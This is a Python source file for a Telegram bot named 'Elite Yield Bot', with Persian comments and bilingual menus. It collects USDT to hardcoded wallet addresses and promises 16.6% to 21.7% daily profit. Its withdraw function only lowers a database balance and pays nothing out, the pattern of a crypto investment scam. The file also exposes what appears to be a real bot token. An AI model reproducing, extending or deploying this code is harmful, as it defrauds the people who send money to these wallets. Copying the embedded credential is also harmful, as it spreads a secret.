import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import threading
import time
import logging
from datetime import datetime

logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 123456789
bot = telebot.TeleBot(BOT_TOKEN)

TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()

# ساخت جداول
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Level1',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en',
    deposit_amount REAL DEFAULT 0
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS support_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    message_text TEXT,
    status TEXT DEFAULT 'new',
    created_at INTEGER
)''')
conn.commit()

# زبان‌ها
languages = {
    'en': {
        'welcome': "🌟 Welcome to Elite Yield Bot! 🚀",
        'balance_btn': 'Balance',
        'deposit_btn': 'Deposit',
        'withdraw_btn': 'Withdraw',
        'referral_btn': 'Referral',
        'support_btn': 'Support',
        'admin_btn': 'Admin Panel',
        'support_tickets_btn': 'Support Tickets',
        'enter_amount': 'Enter amount (min $10):',
        'invalid_amount': 'Invalid amount!',
        'deposit_instructions': f"Send USDT to:\nTRC20: {TRC20_WALLET}\nBEP20: {BEP20_WALLET}\nMin $10. Confirm after sending.",
        'daily_profit': 'Daily profit added: ${profit:.2f}\nNew balance: ${new_balance:.2f}'
    },
    'fa': {
        'welcome': "🌟 خوش آمدید به Elite Yield Bot! 🚀",
        'balance_btn': 'موجودی',
        'deposit_btn': 'واریز',
        'withdraw_btn': 'برداشت',
        'referral_btn': 'رفرال',
        'support_btn': 'پشتیبانی',
        'admin_btn': 'پنل ادمین',
        'support_tickets_btn': 'تیکت‌های پشتیبانی',
        'enter_amount': 'مبلغ را وارد کنید (حداقل 10$):',
        'invalid_amount': 'نامعتبر!',
        'deposit_instructions': f"USDT را به:\nTRC20: {TRC20_WALLET}\nBEP20: {BEP20_WALLET}\nحداقل 10$. پس از ارسال تأیید کنید.",
        'daily_profit': 'سود روزانه اضافه شد: ${profit:.2f}\nموجودی جدید: ${new_balance:.2f}'
    }
}

# دکمه‌ها
def main_menu(is_admin=False, lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(l['balance_btn'], l['deposit_btn'])
    markup.add(l['withdraw_btn'], l['referral_btn'])
    markup.add(l['support_btn'])
    if is_admin:
        markup.add(l['admin_btn'])
    return markup

# زبان کاربر
def get_user_lang(user_id):
    cursor.execute('SELECT language FROM users WHERE user_id=?', (user_id,))
    result = cursor.fetchone()
    return result[0] if result else 'en'

# منوی ادمین
def admin_menu(lang='en'):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('Users List', 'Support Tickets', 'Back')
    return markup

# سود روزانه
def add_daily_profit():
    while True:
        cursor.execute('SELECT user_id, deposit_amount, last_profit_time, language FROM users WHERE deposit_amount>0')
        users = cursor.fetchall()
        current_time = int(time.time())
        for user in users:
            user_id, deposit, last_time, lang = user
            if current_time - last_time >= 86400:
                rate = 0.166 if deposit < 100 else 0.179 if deposit < 800 else 0.196 if deposit < 2400 else 0.217
                profit = deposit * rate
                cursor.execute('UPDATE users SET balance=balance+?, total_profit=total_profit+?, last_profit_time=? WHERE user_id=?',
                               (profit, profit, current_time, user_id))
                conn.commit()
                bot.send_message(user_id, languages[lang]['daily_profit'].format(profit=profit, new_balance=deposit+profit))
        time.sleep(3600)

# شروع
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username or f'User_{user_id}'
    cursor.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO users (user_id, username, created_at) VALUES (?,?,?)', (user_id, username, int(time.time())))
        conn.commit()
    is_admin = user_id == ADMIN_ID
    lang = get_user_lang(user_id)
    bot.send_message(message.chat.id, languages[lang]['welcome'], reply_markup=main_menu(is_admin, lang))

# مدیریت پیام‌ها
@bot.message_handler(func=lambda message: True)
def handle(message):
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    l = languages[lang]
    is_admin = user_id == ADMIN_ID

    if message.text == l['balance_btn']:
        cursor.execute('SELECT balance FROM users WHERE user_id=?', (user_id,))
        balance = cursor.fetchone()[0]
        bot.send_message(message.chat.id, f"Balance: ${balance:.2f}", reply_markup=main_menu(is_admin, lang))

    elif message.text == l['deposit_btn']:
        bot.send_message(message.chat.id, l['deposit_instructions'])
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_deposit)

    elif message.text == l['withdraw_btn']:
        bot.send_message(message.chat.id, l['enter_amount'])
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_withdraw)

    elif message.text == l['support_btn']:
        msg = bot.send_message(message.chat.id, "Send your message to support:")
        bot.register_next_step_handler(msg, forward_support)

# پردازش واریز
def process_deposit(message):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
        if amount < 10:
            bot.send_message(user_id, "Min $10")
            return
        cursor.execute('UPDATE users SET deposit_amount=deposit_amount+?, balance=balance+? WHERE user_id=?', (amount, amount, user_id))
        conn.commit()
        bot.send_message(user_id, f"Deposit confirmed: ${amount}")
    except:
        bot.send_message(user_id, "Invalid amount!")

# پردازش برداشت
def process_withdraw(message):
    user_id = message.from_user.id
    try:
        amount = float(message.text)
        cursor.execute('SELECT balance FROM users WHERE user_id=?', (user_id,))
        balance = cursor.fetchone()[0]
        if amount > balance:
            bot.send_message(user_id, "Insufficient balance!")
            return
        cursor.execute('UPDATE users SET balance=balance-? WHERE user_id=?', (amount, user_id))
        conn.commit()
        bot.send_message(user_id, f"Withdrawal requested: ${amount}")
    except:
        bot.send_message(user_id, "Invalid amount!")

# فوروارد پیام پشتیبانی
def forward_support(message):
    cursor.execute('INSERT INTO support_messages (user_id, username, message_text, created_at) VALUES (?,?,?,?)',
                   (message.from_user.id, message.from_user.username or "Unknown", message.text, int(time.time())))
    conn.commit()
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    bot.send_message(message.chat.id, "Message sent to support!")

if __name__ == '__main__':
    threading.Thread(target=add_daily_profit, daemon=True).start()
    print("Bot started...")
    bot.polling(none_stop=True)
